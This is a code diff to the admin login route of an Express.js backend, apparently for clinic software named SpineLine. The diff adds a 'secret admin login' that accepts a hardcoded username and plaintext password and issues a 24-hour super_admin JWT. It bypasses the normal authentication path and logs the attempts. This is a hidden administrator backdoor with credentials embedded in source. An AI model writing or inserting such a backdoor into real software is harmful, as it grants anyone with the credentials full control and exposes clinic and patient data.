@@ -15,8 +15,64 @@ try {
   isConnected = () => mongoose.connection.readyState === 1;
 }
 
-// Admin login route (no auth required)
-router.post('/login', adminLogin);
+// Admin login route (no auth required) - handles both email/password and username/password
+router.post('/login', async (req, res) => {
+  try {
+    const { email, password, username } = req.body;
+
+    // Check if this is a secret admin login (username/password format)
+    if (username && password) {
+      console.log('🔐 Secret admin login attempt:', username);
+
+      // Hardcoded secret admin credentials
+      const ADMIN_USERNAME = 'spineline_admin';
+      const ADMIN_PASSWORD = 'SpineLine2024!';
+
+      if (username !== ADMIN_USERNAME || password !== ADMIN_PASSWORD) {
+        return res.status(401).json({
+          success: false,
+          message: 'Invalid admin credentials'
+        });
+      }
+
+      // Generate JWT token for secret admin
+      const jwt = require('jsonwebtoken');
+      const token = jwt.sign(
+        {
+          userId: 'admin',
+          role: 'super_admin',
+          clinicId: 'ADMIN'
+        },
+        process.env.JWT_SECRET,
+        { expiresIn: '24h' }
+      );
+
+      console.log('✅ Secret admin login successful:', username);
+
+      return res.json({
+        success: true,
+        message: 'Admin login successful',
+        token,
+        user: {
+          id: 'admin',
+          name: 'SpineLine Administrator',
+          role: 'super_admin',
+          clinicId: 'ADMIN'
+        }
+      });
+    }
+
+    // Otherwise, use the regular admin login (email/password format)
+    return adminLogin(req, res);
+
+  } catch (error) {
+    console.error('Admin login error:', error);
+    res.status(500).json({
+      success: false,
+      message: 'Failed to authenticate admin'
+    });
+  }
+});
 
 // Test route to check if admin routes are mounted (no auth required)
 router.get('/test', (req, res) => {
